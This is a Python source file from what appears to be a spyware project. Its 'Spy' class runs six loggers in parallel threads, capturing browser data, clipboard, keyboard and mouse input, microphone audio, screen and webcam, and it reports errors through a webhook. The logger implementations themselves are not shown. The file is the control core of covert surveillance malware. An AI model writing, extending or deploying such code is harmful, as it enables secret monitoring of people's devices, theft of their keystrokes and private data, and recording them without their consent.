import threading

from core.loggers.browser_logger import BrowserLogger
from core.loggers.clipboard_logger import ClipboardLogger
from core.loggers.input_logger import InputLogger
from core.loggers.microphone_logger import MicrophoneLogger
from core.loggers.screen_logger import ScreenLogger
from core.loggers.webcam_logger import WebcamLogger

from core.utils.file_utils import create_log_directories
from config.config import LOGS_DIRECTORY
from core.webhook import send_error


class Spy:
    def __init__(self):
        create_log_directories(LOGS_DIRECTORY)
        self.browser_logger = BrowserLogger()
        self.clipboard_logger = ClipboardLogger()
        self.input_logger = InputLogger()
        self.microphone_logger = MicrophoneLogger()
        self.screen_logger = ScreenLogger()
        self.webcam_logger = WebcamLogger()

        self.loggers = [
            self.browser_logger,
            self.clipboard_logger,
            self.input_logger,
            self.microphone_logger,
            self.screen_logger,
            self.webcam_logger
        ]
        self.threads = []

    def start(self):
        for logger in self.loggers:
            thread = threading.Thread(target=logger.run, name=logger.__class__.__name__)
            thread.start()
            self.threads.append(thread)

    def stop(self):
        for logger in self.loggers:
            logger.running = False
        for thread in self.threads:
            thread.join()

    def handle_error(self, e):
        self.stop()
        print("Error!")
        send_error(e)
        pass
